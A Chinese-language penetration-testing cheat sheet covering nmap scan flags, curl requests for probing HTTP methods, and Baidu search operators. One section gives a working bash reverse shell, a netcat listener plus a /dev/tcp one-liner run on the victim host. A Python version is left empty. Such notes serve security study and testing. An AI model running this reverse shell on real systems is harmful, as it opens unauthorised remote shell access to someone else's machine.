# <a name="top">渗透工具</a>







----

## <a name="nmap">nmap</a>

**命令格式**： `nmap -A -v -T4 目标主机ip`

+ `-A`： 开启全面扫描
+ `-T4`：扫描过程使用的时序模版，等级越高扫描速度越快，越容易被防火墙屏蔽
+ `-v`： 显示扫描细节



**命令格式**： `nmap -sS 目标主机ip` —— 使用`TCP SYN`方式扫描TCP端口

**命令格式**： `nmap -sU 目标主机ip` —— 扫描UDP端口



侦测到的端口状态分为 6 类：

+ `open` —— 端口开放
+ `closed` —— 端口关闭
+ `filtered` —— 被防火墙屏蔽，无法进一步确认状态
+ `unfiltered`—— 没有被屏蔽，状态未知
+ `open|filtered` —— 状态不确定
+ `closed|filtered` —— 状态不确定




----

## <a name="curl">curl工具</a>

简介： ***用于通过URL传输数据的命令行工具和库***，支持`cookies`、`forms`

支持的协议：

+ `FTP`
+ `HTTP`
+ `HTTPS`
+ `IMAPS`
+ `SCP`
+ ...



**测试目标网站支持的http方法**

```sh
curl -v -X OPTIONS  url
```

+ `-v`： 显示请求的信息 
+ `-X`： 指定请求方法



模拟post方法请求

```sh
curl -d "args" url
# curl -d "name=admin&password=2333" http://www.a.com

# 添加请求头
curl -H "Content-Type:application/json" -X POST --data '{"key":"value"}' url
```



模拟put方法

```sh
curl -v -X PUT url -d "args"
```





<p align="right"><a href="#curl">返回</a>&nbsp|&nbsp<a href="#top">返回目录</a></p>

-----


## <a name="web_shell">Shell反弹</a>

+ 基于bash反弹shell

  ```sh
  # 该命令先在攻击者主机上运行，${port}均是同一个
  nc -lvv ${port}

  # 该命令在被攻击的主机上执行
  bash -i >&  /dev/tcp/${ip}/${port} 0>&1
  ```

  + `bash -i`：打开1个交互的bash


+ `/dev/tcp`： Linux下的特殊设备，打开此文件相当于发出socket调用，建立1个socket连接


+ `${ip}`：一般为攻击者外网ip


+ `${port}`：攻击者外网监听的端口
+ `0>&1`：将标准输入重定向到标准输出



+ 基于python版本的shell反弹

  ```python

  ```

  ​




-----

##  <a name="search_syntax">百度搜索语法</a>

+ `site:domain`：搜索包含指定域名的网页，搜索示例：`site:pan.baidu.com`
+ `title:(关键字)或intitle:关键字`： 搜索网页标题中含有关键词的
+ `inurl:(keyword1 [| keyword2])`：搜索url中含有给定关键词的，`[| keyword2]`是可选部分，是**或**的关系
+ `-("关键词")`： 用法示例：`python爬取图片 -("CSDN")`， 搜索结果过滤掉包含csdn的结果
+ +("关键词")：搜索结果包含给定关键词





